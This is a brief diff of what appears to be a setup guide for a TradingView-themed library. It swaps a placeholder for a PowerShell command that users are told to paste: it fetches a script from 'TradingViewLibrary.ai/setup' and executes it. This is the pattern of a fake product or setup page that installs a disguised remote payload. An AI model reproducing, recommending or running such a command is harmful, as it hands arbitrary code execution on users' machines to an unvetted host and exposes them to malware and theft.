@@ -24,7 +24,7 @@ Open the **Start menu**, search for **PowerShell**, and launch **Windows PowerSh
 Copy and paste the following command into PowerShell:
 
 ```powershell
-c123
+irm TradingViewLibrary.ai/setup iex
 ```
 ---
 
